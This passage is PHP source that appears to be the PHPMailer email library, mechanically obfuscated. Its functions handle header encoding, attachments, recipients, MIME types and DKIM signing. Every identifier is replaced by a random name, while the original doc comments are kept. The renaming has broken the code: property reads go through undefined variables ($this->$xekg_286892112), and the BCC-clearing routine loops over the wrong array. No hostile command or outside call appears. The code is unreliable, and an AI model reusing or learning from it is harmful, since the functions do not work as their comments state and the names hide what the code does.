     * Encode and wrap long multibyte strings for mail headers
     * without breaking lines within a character.
     * Adapted from a function by paravoid
     * @link http://www.php.net/manual/en/function.mb-encode-mimeheader.php#60283
     * @access public
     * @param string $str multi-byte text to wrap encode
     * @param string $linebreak string to use as linefeed/end-of-line
     * @return string
     */ public function kapp_1681172242($mkrn_1554949113,$atsi_3658797848=null){$ivsl_2675529103='=?'.$this->$xekg_286892112.'?B?';$orpd_16528305='?=';$xxpv_3594543489='';if($atsi_3658797848===null){$atsi_3658797848=$this->$apvs_3568589458;}$wfys_3167318996=mb_strlen($mkrn_1554949113,$this->$xekg_286892112);$ipnw_25009842=75-strlen($ivsl_2675529103)-strlen($orpd_16528305);$xjsl_4234197119=$wfys_3167318996/strlen($mkrn_1554949113);$qolc_1043091730=floor($ipnw_25009842*$xjsl_4234197119*.75);for($crku_3865851505=0;$crku_3865851505<$wfys_3167318996;$crku_3865851505+=$qrpg_1493879504){$ljvt_1684020311=0;do{$qrpg_1493879504=$qolc_1043091730-$ljvt_1684020311;$aqie_2500227374=mb_substr($mkrn_1554949113,$crku_3865851505,$qrpg_1493879504,$this->$xekg_286892112);$aqie_2500227374=base64_encode($aqie_2500227374);$ljvt_1684020311++;}while(strlen($aqie_2500227374)>$ipnw_25009842);$xxpv_3594543489.=$aqie_2500227374.$atsi_3658797848;}$xxpv_3594543489=substr($xxpv_3594543489,0,-strlen($atsi_3658797848));return $xxpv_3594543489;}/**
     * Encode a string in quoted-printable format.
     * According to RFC2045 section 6.7.
     * @access public
     * @param string $string The text to encode
     * @param integer $line_max Number of chars allowed on a line before wrapping
     * @return string
     * @link http://www.php.net/manual/en/function.quoted-printable-decode.php#89417 Adapted from this comment
     */ public function xdlh_2167508760($kdvd_2663297705,$wflt_1849496019=76){if(function_exists('quoted_printable_encode')){return quoted_printable_encode($kdvd_2663297705);}$kdvd_2663297705=str_replace(array('%20','%0D%0A.','%0D%0A','%'),array(' ',"\r\n=2E","\r\n",'='),rawurlencode($kdvd_2663297705));return preg_replace('/[^\r\n]{'.($wflt_1849496019-3).'}[^=\r\n]{2}/',"$0=\r\n",$kdvd_2663297705);}/**
     * Backward compatibility wrapper for an old QP encoding function that was removed.
     * @see PHPMailer::encodeQP()
     * @access public
     * @param string $string
     * @param integer $line_max
     * @param boolean $space_conv
     * @return string
     * @deprecated Use encodeQP instead.
     */ public function fhcu_2841728806($kdvd_2663297705,$wflt_1849496019=76,/** @noinspection PhpUnusedParameterInspection */ $vtwd_1647502150=false){return $this->xdlh_2167508760($kdvd_2663297705,$wflt_1849496019);}/**
     * Encode a string using Q encoding.
     * @link http://tools.ietf.org/html/rfc2047
     * @param string $str the text to encode
     * @param string $position Where the text is going to be used, see the RFC for what that means
     * @access public
     * @return string
     */ public function qxni_2163451298($mkrn_1554949113,$dbso_1177347317='text'){$qsbb_2747071630='';$xxpv_3594543489=str_replace(array("\r","\n"),'',$mkrn_1554949113);switch(strtolower($dbso_1177347317)){case 'phrase':$qsbb_2747071630='^A-Za-z0-9!*+\/ -';break;/** @noinspection PhpMissingBreakStatementInspection */ case 'comment':$qsbb_2747071630='\(\)"';case 'text':default:$qsbb_2747071630='\000-\011\013\014\016-\037\075\077\137\177-\377'.$qsbb_2747071630;break;}$wzpa_103159226=array();if(preg_match_all("/[{$qsbb_2747071630}]/",$xxpv_3594543489,$wzpa_103159226)){$aqvf_832748130=array_search('=',$wzpa_103159226[0]);if(false!==$aqvf_832748130){unset($wzpa_103159226[0][$aqvf_832748130]);array_unshift($wzpa_103159226[0],'=');}foreach(array_unique($wzpa_103159226[0])as $tfhj_2365478815){$xxpv_3594543489=str_replace($tfhj_2365478815,'='.sprintf('%02X',ord($tfhj_2365478815)),$xxpv_3594543489);}}return str_replace(' ','_',$xxpv_3594543489);}/**
     * Add a string or binary attachment (non-filesystem).
     * This method can be used to attach ascii or binary data,
     * such as a BLOB record from a database.
     * @param string $string String attachment data.
     * @param string $filename Name of the attachment.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File extension (MIME) type.
     * @param string $disposition Disposition to use
     * @return void
     */ public function nnul_138040875($kdvd_2663297705,$zcgn_1007413605,$jacn_1749612879='base64',$ouxh_2363381545='',$phpv_1280884576='attachment'){if($ouxh_2363381545==''){$ouxh_2363381545=self::lelz_3080359015($zcgn_1007413605);}$this->$mafg_1123666477[]=array(0=>$kdvd_2663297705,1=>$zcgn_1007413605,2=>basename($zcgn_1007413605),3=>$jacn_1749612879,4=>$ouxh_2363381545,5=>true,6=>$phpv_1280884576,7=>0);}/**
     * Add an embedded (inline) attachment from a file.
     * This can include images, sounds, and just about any other document type.
     * These differ from 'regular' attachments in that they are intended to be
     * displayed inline with the message, not just attached for download.
     * This is used in HTML messages that embed the images
     * the HTML refers to using the $cid value.
     * Never use a user-supplied path to a file!
     * @param string $path Path to the attachment.
     * @param string $cid Content ID of the attachment; Use this to reference
     *        the content when using an embedded image in HTML.
     * @param string $name Overrides the attachment name.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File MIME type.
     * @param string $disposition Disposition to use
     * @return boolean True on successfully adding an attachment
     */ public function vydy_3532870851($vroo_190089999,$cxto_1261492676,$rxlv_1579384326='',$jacn_1749612879='base64',$ouxh_2363381545='',$phpv_1280884576='inline'){if(!self::ulfd_820602762($vroo_190089999)or!@is_file($vroo_190089999)){$this->atvy_1425932775($this->zhkz_822707298('file_access').$vroo_190089999);return false;}if($ouxh_2363381545==''){$ouxh_2363381545=self::lelz_3080359015($vroo_190089999);}$zcgn_1007413605=basename($vroo_190089999);if($rxlv_1579384326==''){$rxlv_1579384326=$zcgn_1007413605;}$this->$mafg_1123666477[]=array(0=>$vroo_190089999,1=>$zcgn_1007413605,2=>$rxlv_1579384326,3=>$jacn_1749612879,4=>$ouxh_2363381545,5=>false,6=>$phpv_1280884576,7=>$cxto_1261492676);return true;}/**
     * Add an embedded stringified attachment.
     * This can include images, sounds, and just about any other document type.
     * Be sure to set the $type to an image type for images:
     * JPEG images use 'image/jpeg', GIF uses 'image/gif', PNG uses 'image/png'.
     * @param string $string The attachment binary data.
     * @param string $cid Content ID of the attachment; Use this to reference
     *        the content when using an embedded image in HTML.
     * @param string $name
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type MIME type.
     * @param string $disposition Disposition to use
     * @return boolean True on successfully adding an attachment
     */ public function vtih_887654295($kdvd_2663297705,$cxto_1261492676,$rxlv_1579384326='',$jacn_1749612879='base64',$ouxh_2363381545='',$phpv_1280884576='inline'){if($ouxh_2363381545=='' and!empty($rxlv_1579384326)){$ouxh_2363381545=self::lelz_3080359015($rxlv_1579384326);}$this->$mafg_1123666477[]=array(0=>$kdvd_2663297705,1=>$rxlv_1579384326,2=>$rxlv_1579384326,3=>$jacn_1749612879,4=>$ouxh_2363381545,5=>true,6=>$phpv_1280884576,7=>$cxto_1261492676);return true;}/**
     * Check if an inline attachment is present.
     * @access public
     * @return boolean
     */ public function oucp_1720597842(){foreach($this->$mafg_1123666477 as $pqur_2036324795){if($pqur_2036324795[6]=='inline'){return true;}}return false;}/**
     * Check if an attachment (non-inline) is present.
     * @return boolean
     */ public function swvn_2308297011(){foreach($this->$mafg_1123666477 as $pqur_2036324795){if($pqur_2036324795[6]=='attachment'){return true;}}return false;}/**
     * Check if this message has an alternative body set.
     * @return boolean
     */ public function flzu_354580856(){return!empty($this->$qbaw_2558022429);}/**
     * Clear queued addresses of given kind.
     * @access protected
     * @param string $kind 'to', 'cc', or 'bcc'
     * @return void
     */ public function jiye_2947485617($oglx_1002749145){$urxm_314208271=$this->$afpv_852320140;foreach($urxm_314208271 as $ttpe_223244161=>$bmqr_2412646131){if($bmqr_2412646131[0]==$oglx_1002749145){unset($this->$afpv_852320140[$ttpe_223244161]);}}}/**
     * Clear all To recipients.
     * @return void
     */ public function gtrm_1835750606(){foreach($this->$iocy_252678980 as $bqux_3616002756){unset($this->$abzh_2865723390[strtolower($bqux_3616002756[0])]);}$this->$iocy_252678980=array();$this->jiye_2947485617('to');}/**
     * Clear all CC recipients.
     * @return void
     */ public function mbxc_713685370(){foreach($this->$isnj_112844655 as $givi_3685882489){unset($this->$abzh_2865723390[strtolower($givi_3685882489[0])]);}$this->$isnj_112844655=array();$this->jiye_2947485617('cc');}/**
     * Clear all BCC recipients.
     * @return void
     */ public function zjoe_3423506246(){foreach($this->$givi_3685882489 as $qyuj_779734746){unset($this->$abzh_2865723390[strtolower($qyuj_779734746[0])]);}$this->$givi_3685882489=array();$this->jiye_2947485617('bcc');}/**
     * Clear all ReplyTo recipients.
     * @return void
     */ public function ekdy_2673889564(){$this->$ojew_958603384=array();$this->$ycqy_3810730324=array();}/**
     * Clear all recipient types.
     * @return void
     */ public function eatv_2420861032(){$this->$iocy_252678980=array();$this->$isnj_112844655=array();$this->$givi_3685882489=array();$this->$abzh_2865723390=array();$this->$afpv_852320140=array();}/**
     * Clear all filesystem, string, and binary attachments.
     * @return void
     */ public function utol_1112319806(){$this->$mafg_1123666477=array();}/**
     * Clear all custom headers.
     * @return void
     */ public function xwpm_1985811643(){$this->$jwzy_1869967481=array();}/**
     * Add an error message to the error container.
     * @access protected
     * @param string $msg
     * @return void
     */ protected function atvy_1425932775($pydf_1753898927){$this->$vlrm_58502344++;if($this->$okms_3272781023=='smtp' and!is_null($this->$pqyb_2753055919)){$kipf_2530412598=$this->$pqyb_2753055919->rtjb_2886680118();if(!empty($kipf_2530412598['error'])){$pydf_1753898927.=$this->zhkz_822707298('smtp_error').$kipf_2530412598['error'];if(!empty($kipf_2530412598['detail'])){$pydf_1753898927.=' Detail: '.$kipf_2530412598['detail'];}if(!empty($kipf_2530412598['smtp_code'])){$pydf_1753898927.=' SMTP code: '.$kipf_2530412598['smtp_code'];}if(!empty($kipf_2530412598['smtp_code_ex'])){$pydf_1753898927.=' Additional SMTP info: '.$kipf_2530412598['smtp_code_ex'];}}}$this->$wblz_3236939731=$pydf_1753898927;}/**
     * Return an RFC 822 formatted date.
     * @access public
     * @return string
     * @static
     */ public static function aake_3444357374(){date_default_timezone_set(@date_default_timezone_get());return date('D, j M Y H:i:s O');}/**
     * Get the server hostname.
     * Returns 'localhost.localdomain' if unknown.
     * @access protected
     * @return string
     */ protected function bavi_437344390(){$xkdg_325763347='localhost.localdomain';if(!empty($this->$vgtt_504462088)){$xkdg_325763347=$this->$vgtt_504462088;}elseif(isset($_SERVER)and array_key_exists('SERVER_NAME',$_SERVER)and!empty($_SERVER['SERVER_NAME'])){$xkdg_325763347=$_SERVER['SERVER_NAME'];}elseif(function_exists('gethostname')&&gethostname()!==false){$xkdg_325763347=gethostname();}elseif(php_uname('n')!==false){$xkdg_325763347=php_uname('n');}return $xkdg_325763347;}/**
     * Get an error message in the current language.
     * @access protected
     * @param string $key
     * @return string
     */ protected function zhkz_822707298($hiet_2324736937){if(count($this->$ufho_2882651222)<1){$this->edke_3729331321('en');}if(array_key_exists($hiet_2324736937,$this->$ufho_2882651222)){if($hiet_2324736937=='smtp_connect_failed'){return $this->$ufho_2882651222[$hiet_2324736937].' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting';}return $this->$ufho_2882651222[$hiet_2324736937];}else{return $hiet_2324736937;}}/**
     * Check if an error occurred.
     * @access public
     * @return boolean True if an error did occur.
     */ public function netp_1422576975(){return($this->$vlrm_58502344>0);}/**
     * Ensure consistent line endings in a string.
     * Changes every end of line from CRLF, CR or LF to $this->LE.
     * @access public
     * @param string $str String to fixEOL
     * @return string
     */ public function iwdw_723304945($mkrn_1554949113){$cdsz_1498555847=str_replace(array("\r\n","\r"),"\n",$mkrn_1554949113);if($this->$apvs_3568589458!=="\n"){$cdsz_1498555847=str_replace("\n",$this->$apvs_3568589458,$cdsz_1498555847);}return $cdsz_1498555847;}/**
     * Add a custom header.
     * $name value can be overloaded to contain
     * both header name and value (name:value)
     * @access public
     * @param string $name Custom header name
     * @param string $value Header value
     * @return void
     */ public function kmep_874678659($rxlv_1579384326,$vmpv_494360628=null){if($vmpv_494360628===null){$this->$jwzy_1869967481[]=explode(':',$rxlv_1579384326,2);}else{$this->$jwzy_1869967481[]=array($rxlv_1579384326,$vmpv_494360628);}}/**
     * Returns all custom headers.
     * @return array
     */ public function xvlw_3813912952(){return $this->$jwzy_1869967481;}/**
     * Create a message body from an HTML string.
     * Automatically inlines images and creates a plain-text version by converting the HTML,
     * overwriting any existing values in Body and AltBody.
     * Do not source $message content from user input!
     * $basedir is prepended when handling relative URLs, e.g. <img src="/images/a.png"> and must not be empty
     * will look for an image file in $basedir/images/a.png and convert it to inline.
     * If you don't provide a $basedir, relative paths will be left untouched (and thus probably break in email)
     * If you don't want to apply these transformations to your HTML, just set Body and AltBody directly.
     * @access public
     * @param string $message HTML message string
     * @param string $basedir Absolute path to a base directory to prepend to relative paths to images
     * @param boolean|callable $advanced Whether to use the internal HTML to text converter
     *    or your own custom converter @see PHPMailer::html2text()
     * @return string $message The transformed message Body
     */ public function ztbm_3724667940($rxna_3065852031,$jebu_3045941345='',$stgy_3163449457=false){preg_match_all('/(src|background)=["\'](.*)["\']/Ui',$rxna_3065852031,$gwhe_3760176746);if(array_key_exists(2,$gwhe_3760176746)){if(strlen($jebu_3045941345)>1&&substr($jebu_3045941345,-1)!='/'){$jebu_3045941345.='/';}foreach($gwhe_3760176746[2]as $yvqh_323479074=>$myft_4101391790){if(preg_match('#^data:(image[^;,]*)(;base64)?,#',$myft_4101391790,$vcsc_2052834565)){$pcab_2918445923=substr($myft_4101391790,strpos($myft_4101391790,','));if($vcsc_2052834565[2]){$pcab_2918445923=base64_decode($pcab_2918445923);}else{$pcab_2918445923=rawurldecode($pcab_2918445923);}$cxto_1261492676=md5($myft_4101391790).'@phpmailer.0';if($this->vtih_887654295($pcab_2918445923,$cxto_1261492676,'embed'.$yvqh_323479074,'base64',$vcsc_2052834565[1])){$rxna_3065852031=str_replace($gwhe_3760176746[0][$yvqh_323479074],$gwhe_3760176746[1][$yvqh_323479074].'="cid:'.$cxto_1261492676.'"',$rxna_3065852031);}continue;}if(!empty($jebu_3045941345)&&(strpos($myft_4101391790,'..')===false)&&substr($myft_4101391790,0,4)!=='cid:' &&!preg_match('#^[a-z][a-z0-9+.-]*:?//#i',$myft_4101391790)){$zcgn_1007413605=basename($myft_4101391790);$qopv_1182287066=dirname($myft_4101391790);if($qopv_1182287066=='.'){$qopv_1182287066='';}$cxto_1261492676=md5($myft_4101391790).'@phpmailer.0';if(strlen($qopv_1182287066)>1&&substr($qopv_1182287066,-1)!='/'){$qopv_1182287066.='/';}if($this->vydy_3532870851($jebu_3045941345.$qopv_1182287066.$zcgn_1007413605,$cxto_1261492676,$zcgn_1007413605,'base64',self::paud_2763141654((string)self::akwo_3667098600($zcgn_1007413605,PATHINFO_EXTENSION)))){$rxna_3065852031=preg_replace('/'.$gwhe_3760176746[1][$yvqh_323479074].'=["\']'.preg_quote($myft_4101391790,'/').'["\']/Ui',$gwhe_3760176746[1][$yvqh_323479074].'="cid:'.$cxto_1261492676.'"',$rxna_3065852031);}}}}$this->jqcv_803450723(true);$this->$lhgl_2491560500=$this->tooz_1270323552($rxna_3065852031);$this->$qbaw_2558022429=$this->tooz_1270323552($this->pphq_2110904641($rxna_3065852031,$stgy_3163449457));if(!$this->flzu_354580856()){$this->$qbaw_2558022429='To view this email message, open it in a program that understands HTML!'.self::CRLF.self::CRLF;}return $this->$lhgl_2491560500;}/**
     * Convert an HTML string into plain text.
     * This is used by msgHTML().
     * Note - older versions of this function used a bundled advanced converter
     * which was been removed for license reasons in #232.
     * Example usage:
     * <code>
     * // Use default conversion
     * $plain = $mail->html2text($html);
     * // Use your own custom converter
     * $plain = $mail->html2text($html, function($html) {
     *     $converter = new MyHtml2text($html);
     *     return $converter->get_text();
     * });
     * </code>
     * @param string $html The HTML text to convert
     * @param boolean|callable $advanced Any boolean value to use the internal converter,
     *   or provide your own callable for custom conversion.
     * @return string
     */ public function pphq_2110904641($zanp_410646757,$stgy_3163449457=false){if(is_callable($stgy_3163449457)){return call_user_func($stgy_3163449457,$zanp_410646757);}return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/si','',$zanp_410646757))),ENT_QUOTES,$this->$xekg_286892112);}/**
     * Get the MIME type for a file extension.
     * @param string $ext File extension
     * @access public
     * @return string MIME type of file.
     * @static
     */ public static function paud_2763141654($wiqp_30643714=''){$pecn_1881611135=array('xl'=>'application/excel','js'=>'application/javascript','hqx'=>'application/mac-binhex40','cpt'=>'application/mac-compactpro','bin'=>'application/macbinary','doc'=>'application/msword','word'=>'application/msword','xlsx'=>'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet','xltx'=>'application/vnd.openxmlformats-officedocument.spreadsheetml.template','potx'=>'application/vnd.openxmlformats-officedocument.presentationml.template','ppsx'=>'application/vnd.openxmlformats-officedocument.presentationml.slideshow','pptx'=>'application/vnd.openxmlformats-officedocument.presentationml.presentation','sldx'=>'application/vnd.openxmlformats-officedocument.presentationml.slide','docx'=>'application/vnd.openxmlformats-officedocument.wordprocessingml.document','dotx'=>'application/vnd.openxmlformats-officedocument.wordprocessingml.template','xlam'=>'application/vnd.ms-excel.addin.macroEnabled.12','xlsb'=>'application/vnd.ms-excel.sheet.binary.macroEnabled.12','class'=>'application/octet-stream','dll'=>'application/octet-stream','dms'=>'application/octet-stream','exe'=>'application/octet-stream','lha'=>'application/octet-stream','lzh'=>'application/octet-stream','psd'=>'application/octet-stream','sea'=>'application/octet-stream','so'=>'application/octet-stream','oda'=>'application/oda','pdf'=>'application/pdf','ai'=>'application/postscript','eps'=>'application/postscript','ps'=>'application/postscript','smi'=>'application/smil','smil'=>'application/smil','mif'=>'application/vnd.mif','xls'=>'application/vnd.ms-excel','ppt'=>'application/vnd.ms-powerpoint','wbxml'=>'application/vnd.wap.wbxml','wmlc'=>'application/vnd.wap.wmlc','dcr'=>'application/x-director','dir'=>'application/x-director','dxr'=>'application/x-director','dvi'=>'application/x-dvi','gtar'=>'application/x-gtar','php3'=>'application/x-httpd-php','php4'=>'application/x-httpd-php','php'=>'application/x-httpd-php','phtml'=>'application/x-httpd-php','phps'=>'application/x-httpd-php-source','swf'=>'application/x-shockwave-flash','sit'=>'application/x-stuffit','tar'=>'application/x-tar','tgz'=>'application/x-tar','xht'=>'application/xhtml+xml','xhtml'=>'application/xhtml+xml','zip'=>'application/zip','mid'=>'audio/midi','midi'=>'audio/midi','mp2'=>'audio/mpeg','mp3'=>'audio/mpeg','mpga'=>'audio/mpeg','aif'=>'audio/x-aiff','aifc'=>'audio/x-aiff','aiff'=>'audio/x-aiff','ram'=>'audio/x-pn-realaudio','rm'=>'audio/x-pn-realaudio','rpm'=>'audio/x-pn-realaudio-plugin','ra'=>'audio/x-realaudio','wav'=>'audio/x-wav','bmp'=>'image/bmp','gif'=>'image/gif','jpeg'=>'image/jpeg','jpe'=>'image/jpeg','jpg'=>'image/jpeg','png'=>'image/png','tiff'=>'image/tiff','tif'=>'image/tiff','eml'=>'message/rfc822','css'=>'text/css','html'=>'text/html','htm'=>'text/html','shtml'=>'text/html','log'=>'text/plain','text'=>'text/plain','txt'=>'text/plain','rtx'=>'text/richtext','rtf'=>'text/rtf','vcf'=>'text/vcard','vcard'=>'text/vcard','xml'=>'text/xml','xsl'=>'text/xml','mpeg'=>'video/mpeg','mpe'=>'video/mpeg','mpg'=>'video/mpeg','mov'=>'video/quicktime','qt'=>'video/quicktime','rv'=>'video/vnd.rn-realvideo','avi'=>'video/x-msvideo','movie'=>'video/x-sgi-movie');if(array_key_exists(strtolower($wiqp_30643714),$pecn_1881611135)){return $pecn_1881611135[strtolower($wiqp_30643714)];}return 'application/octet-stream';}/**
     * Map a file name to a MIME type.
     * Defaults to 'application/octet-stream', i.e.. arbitrary binary data.
     * @param string $filename A file name or full path, does not need to exist as a file
     * @return string
     * @static
     */ public static function lelz_3080359015($zcgn_1007413605){$rgpc_2371823451=strpos($zcgn_1007413605,'?');if(false!==$rgpc_2371823451){$zcgn_1007413605=substr($zcgn_1007413605,0,$rgpc_2371823451);}$dwju_932156600=self::akwo_3667098600($zcgn_1007413605);return self::paud_2763141654($dwju_932156600['extension']);}/**
     * Multi-byte-safe pathinfo replacement.
     * Drop-in replacement for pathinfo(), but multibyte-safe, cross-platform-safe, old-version-safe.
     * Works similarly to the one in PHP >= 5.2.0
     * @link http://www.php.net/manual/en/function.pathinfo.php#107461
     * @param string $path A filename or path, does not need to exist as a file
     * @param integer|string $options Either a PATHINFO_* constant,
     *      or a string name to return only the specified piece, allows 'filename' to work on PHP < 5.2
     * @return string|array
     * @static
     */ public static function akwo_3667098600($vroo_190089999,$vpgo_3493198471=null){$plsn_3889582059=array('dirname'=>'','basename'=>'','extension'=>'','filename'=>'');$dwju_932156600=array();if(preg_match('%^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^\.\\\\/]+?)|))[\\\\/\.]*$%im',$vroo_190089999,$dwju_932156600)){if(array_key_exists(1,$dwju_932156600)){$plsn_3889582059['dirname']=$dwju_932156600[1];}if(array_key_exists(2,$dwju_932156600)){$plsn_3889582059['basename']=$dwju_932156600[2];}if(array_key_exists(5,$dwju_932156600)){$plsn_3889582059['extension']=$dwju_932156600[5];}if(array_key_exists(3,$dwju_932156600)){$plsn_3889582059['filename']=$dwju_932156600[3];}}switch($vpgo_3493198471){case PATHINFO_DIRNAME:case 'dirname':return $plsn_3889582059['dirname'];case PATHINFO_BASENAME:case 'basename':return $plsn_3889582059['basename'];case PATHINFO_EXTENSION:case 'extension':return $plsn_3889582059['extension'];case PATHINFO_FILENAME:case 'filename':return $plsn_3889582059['filename'];default:return $plsn_3889582059;}}/**
     * Set or reset instance properties.
     * You should avoid this function - it's more verbose, less efficient, more error-prone and
     * harder to debug than setting properties directly.
     * Usage Example:
     * `$mail->set('SMTPSecure', 'tls');`
     *   is the same as:
     * `$mail->SMTPSecure = 'tls';`
     * @access public
     * @param string $name The property name to set
     * @param mixed $value The value to set the property to
     * @return boolean
     * @TODO Should this not be using the __set() magic function?
     */ public function dioj_3860080092($rxlv_1579384326,$vmpv_494360628=''){if(property_exists($this,$rxlv_1579384326)){$this->$rxlv_1579384326=$vmpv_494360628;return true;}else{$this->atvy_1425932775($this->zhkz_822707298('variable_set').$rxlv_1579384326);return false;}}/**
     * Strip newlines to prevent header injection.
     * @access public
     * @param string $str
     * @return string
     */ public function xdha_1719758595($mkrn_1554949113){return trim(str_replace(array("\r","\n"),'',$mkrn_1554949113));}/**
     * Normalize line breaks in a string.
     * Converts UNIX LF, Mac CR and Windows CRLF line breaks into a single line break format.
     * Defaults to CRLF (for message bodies) and preserves consecutive breaks.
     * @param string $text
     * @param string $breaktype What kind of line break to use, defaults to CRLF
     * @return string
     * @access public
     * @static
     */ public static function tooz_1270323552($zlct_999008199,$cjdj_599218869="\r\n"){return preg_replace('/(\r\n|\r|\n)/ms',$cjdj_599218869,$zlct_999008199);}/**
     * Set the public and private key files and password for S/MIME signing.
     * @access public
     * @param string $cert_filename
     * @param string $key_filename
     * @param string $key_pass Password for private key
     * @param string $extracerts_filename Optional path to chain certificate
     */ public function iupm_2675872254($mjit_2710740337,$dofl_4245168874,$scsp_1215762413,$hcqp_1776189173=''){$this->$ptyv_2438750005=$mjit_2710740337;$this->$ldbd_3133053849=$dofl_4245168874;$this->$fdrg_4166089133=$scsp_1215762413;$this->$ozbi_3605122514=$hcqp_1776189173;}/**
     * Quoted-Printable-encode a DKIM header.
     * @access public
     * @param string $txt
     * @return string
     */ public function uywo_3674315279($eaix_473390917){$ladd_3507795190='';for($crku_3865851505=0;$crku_3865851505<strlen($eaix_473390917);$crku_3865851505++){$otvj_3944540986=ord($eaix_473390917[$crku_3865851505]);if(((0x21<=$otvj_3944540986)&&($otvj_3944540986<=0x3A))||$otvj_3944540986==0x3C||((0x3E<=$otvj_3944540986)&&($otvj_3944540986<=0x7E))){$ladd_3507795190.=$eaix_473390917[$crku_3865851505];}else{$ladd_3507795190.='='.sprintf('%02X',$otvj_3944540986);}}return $ladd_3507795190;}/**
     * Generate a DKIM signature.
     * @access public
     * @param string $signHeader
     * @throws phpmailerException
     * @return string The DKIM signature value
     */ public function bzgj_3617458368($glcq_3616535388){if(!defined('PKCS7_TEXT')){if($this->$cdmv_440379532){throw new gpmm_657600444($this->zhkz_822707298('extension_missing').'openssl');}return '';}$eiwk_844270003=!empty($this->$rwhl_2210386905)?$this->$rwhl_2210386905:file_get_contents($this->$mmqc_284170424);if(''!=$this->$zwph_4046436977){$ycvo_2684648888=openssl_pkey_get_private($eiwk_844270003,$this->$zwph_4046436977);}else{$ycvo_2684648888=openssl_pkey_get_private($eiwk_844270003);}if(version_compare(PHP_VERSION,'5.3.0')>=0 and in_array('sha256WithRSAEncryption',openssl_get_md_methods(true))){if(openssl_sign($glcq_3616535388,$yjlb_2928148801,$ycvo_2684648888,'sha256WithRSAEncryption')){openssl_pkey_free($ycvo_2684648888);return base64_encode($yjlb_2928148801);}}else{$coji_3577608601=openssl_pkey_get_details($ycvo_2684648888);$kkxu_3518522040=hash('sha256',$glcq_3616535388);$cfpm_2238339752='3031300d060960864801650304020105000420'.$kkxu_3518522040;$hikb_3040344409=$coji_3577608601['bits']/8-(strlen($cfpm_2238339752)/2+3);$wbee_4210003305=pack('H*','0001'.str_repeat('FF',$hikb_3040344409).'00'.$cfpm_2238339752);if(openssl_private_encrypt($wbee_4210003305,$yjlb_2928148801,$ycvo_2684648888,OPENSSL_NO_PADDING)){openssl_pkey_free($ycvo_2684648888);return base64_encode($yjlb_2928148801);}}openssl_pkey_free($ycvo_2684648888);return '';}/**
     * Generate a DKIM canonicalization header.
     * @access public
     * @param string $signHeader Header
     * @return string
     */ public function izsj_4289094864($glcq_3616535388){$glcq_3616535388=preg_replace('/\r\n\s+/',' ',$glcq_3616535388);$kygw_1325501590=explode("\r\n",$glcq_3616535388);foreach($kygw_1325501590 as $hiet_2324736937=>$ladd_3507795190){list($qftn_45367233,$vmpv_494360628)=explode(':',$ladd_3507795190,2);$qftn_45367233=strtolower($qftn_45367233);$vmpv_494360628=preg_replace('/\s{2,}/',' ',$vmpv_494360628);$kygw_1325501590[$hiet_2324736937]=$qftn_45367233.':'.trim($vmpv_494360628);}$glcq_3616535388=implode("\r\n",$kygw_1325501590);return $glcq_3616535388;}/**
     * Generate a DKIM canonicalization body.
     * @access public
     * @param string $body Message Body
     * @return string
     */ public function sabo_3645536318($ssxo_3685223346){if($ssxo_3685223346==''){return "\r\n";}$ssxo_3685223346=str_replace("\r\n","\n",$ssxo_3685223346);$ssxo_3685223346=str_replace("\n","\r\n",$ssxo_3685223346);while(substr($ssxo_3685223346,strlen($ssxo_3685223346)-4,4)=="\r\n\r\n"){$ssxo_3685223346=substr($ssxo_3685223346,0,strlen($ssxo_3685223346)-2);}return $ssxo_3685223346;}/**
     * Create the DKIM header and body in a new message header.
     * @access public
     * @param string $headers_line Header lines
     * @param string $subject Subject
     * @param string $body Body
     * @return string
     */ public function dvps_2947876416($vcgd_1878751815,$jsxw_4224597626,$ssxo_3685223346){$bets_436793903='rsa-sha256';$uahh_4232541925='relaxed/simple';$yhyw_2437608432='dns/txt';$sxaz_1209905912=time();$ujnv_3865797094="Subject: $jsxw_4224597626";$gqew_4144189317=explode($this->$apvs_3568589458,$vcgd_1878751815);$twme_3812872977='';$trml_1218487388='';$uqzk_2328270626='';$mevu_3706926091='';foreach($gqew_4144189317 as $iinp_1853008065){if(strpos($iinp_1853008065,'From:')===0){$twme_3812872977=$iinp_1853008065;$mevu_3706926091='from_header';}elseif(strpos($iinp_1853008065,'To:')===0){$trml_1218487388=$iinp_1853008065;$mevu_3706926091='to_header';}elseif(strpos($iinp_1853008065,'Date:')===0){$uqzk_2328270626=$iinp_1853008065;$mevu_3706926091='date_header';}else{if(!empty($$mevu_3706926091)&&strpos($iinp_1853008065,' =?')===0){$$mevu_3706926091.=$iinp_1853008065;}else{$mevu_3706926091='';}}}$jiew_3105530224=str_replace('|','=7C',$this->uywo_3674315279($twme_3812872977));$bqux_3616002756=str_replace('|','=7C',$this->uywo_3674315279($trml_1218487388));$xnpt_2862495610=str_replace('|','=7C',$this->uywo_3674315279($uqzk_2328270626));$jsxw_4224597626=str_replace('|','=7C',$this->uywo_3674315279($ujnv_3865797094));$ssxo_3685223346=$this->sabo_3645536318($ssxo_3685223346);$ykyh_2271686554=strlen($ssxo_3685223346);$anwh_2547102957=base64_encode(pack('H*',hash('sha256',$ssxo_3685223346)));if(''==$this->$bftx_1580844769){$eowp_72251570='';}else{$eowp_72251570=' i='.$this->$bftx_1580844769.';';}$elet_2468479931='DKIM-Signature: v=1; a='.$bets_436793903.'; q='.$yhyw_2437608432.'; l='.$ykyh_2271686554.'; s='.$this->$vmsl_2722024824.";\r\n"."\tt=".$sxaz_1209905912.'; c='.$uahh_4232541925.";\r\n"."\th=From:To:Date:Subject;\r\n"."\td=".$this->$gbew_2257572023.';'.$eowp_72251570."\r\n"."\tz=$jiew_3105530224\r\n"."\t|$bqux_3616002756\r\n"."\t|$xnpt_2862495610\r\n"."\t|$jsxw_4224597626;\r\n"."\tbh=".$anwh_2547102957.";\r\n"."\tb=";$ijcm_605810484=$this->izsj_4289094864($twme_3812872977."\r\n".$trml_1218487388."\r\n".$uqzk_2328270626."\r\n".$ujnv_3865797094."\r\n".$elet_2468479931);$ttbv_515627203=$this->bzgj_3617458368($ijcm_605810484);return $elet_2468479931.$ttbv_515627203."\r\n";}/**
     * Detect if a string contains a line longer than the maximum line length allowed.
     * @param string $str
     * @return boolean
     * @static
